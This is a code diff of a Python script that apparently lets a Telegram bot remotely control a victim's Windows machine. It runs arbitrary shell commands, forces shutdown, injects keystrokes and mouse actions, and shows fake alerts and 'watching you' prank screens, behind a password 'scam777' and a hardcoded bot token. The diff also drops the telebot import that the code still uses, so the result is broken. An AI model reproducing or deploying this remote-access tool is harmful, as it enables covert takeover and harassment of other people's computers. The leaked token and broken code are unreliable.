@@ -1,4 +1,3 @@
-import telebot
 import time
 import subprocess
 import os
@@ -7,44 +6,66 @@ import keyboard
 import pyautogui
 
 password = "scam777"
+
 auth = False
 msgSenden = False
 smthWentWrong = False
 
+
 def me():
     returned_output = str(subprocess.check_output("whoami"))[2:-1]
     return returned_output
+
+
 def clickLeft():
     mouse.click("left")
+
+
 def clickRight():
     mouse.click("right")
+
+
 def shutdown():
     os.system("shutdown -p")
+
+
 def typing(text):
     time.sleep(0.2)
     keyboard.write(text)
+
+
 def switchWindow():
     keyboard.press("alt")
     keyboard.press("tab")
     keyboard.release("alt")
     keyboard.release("tab")
+
+
 def closeWindow():
     keyboard.press("alt")
     keyboard.press("f4")
     keyboard.release("alt")
     keyboard.release("f4")
+
+
 def hideWindows():
     keyboard.press("win")
     keyboard.press("d")
     keyboard.release("win")
     keyboard.release("d")
+
+
 def changeLanguage():
     keyboard.press("shift")
     keyboard.press("alt")
     keyboard.release("shift")
     keyboard.release("alt")
+
+
 def Mystify():
     os.system("Mystify.scr -a")
+
+
 def watchingYou():
     os.system("start cmd")
     time.sleep(0.1)
@@ -54,8 +75,12 @@ def watchingYou():
     keyboard.press("f4")
     keyboard.release("alt")
     keyboard.release("f4")
+
+
 def cmdCommand(cmd):
     os.system(cmd)
+
+
 def matrixRun():
     os.startfile("matrix.bat")
     time.sleep(0.1)
@@ -63,21 +88,31 @@ def matrixRun():
     keyboard.press("enter")
     keyboard.release("alt")
     keyboard.release("enter")
+
+
 def pressKey(key):
     keyboard.press(key)
     keyboard.release(key)
-def dragMouse(x,y):
+
+
+def dragMouse(x, y):
     mouse.drag(0, 0, x, y, absolute=False, duration=0.02)
+
+
 def alert(text):
     pyautogui.alert(text=text, title="Alert", button="OK")
+
+
 def warning(text):
     pyautogui.alert(text=text, title="Warning", button="OK")
+
+
 def scroll(direction):
     for i in range(8):
         mouse.wheel(int(direction))
 
-bot = telebot.TeleBot("2104206797:AAEkqcC6cWILcYhIc_9rC3JGqk9XC32dAd8")
 
+bot = telebot.TeleBot("2104206797:AAEkqcC6cWILcYhIc_9rC3JGqk9XC32dAd8")
 
 while True:
     try:
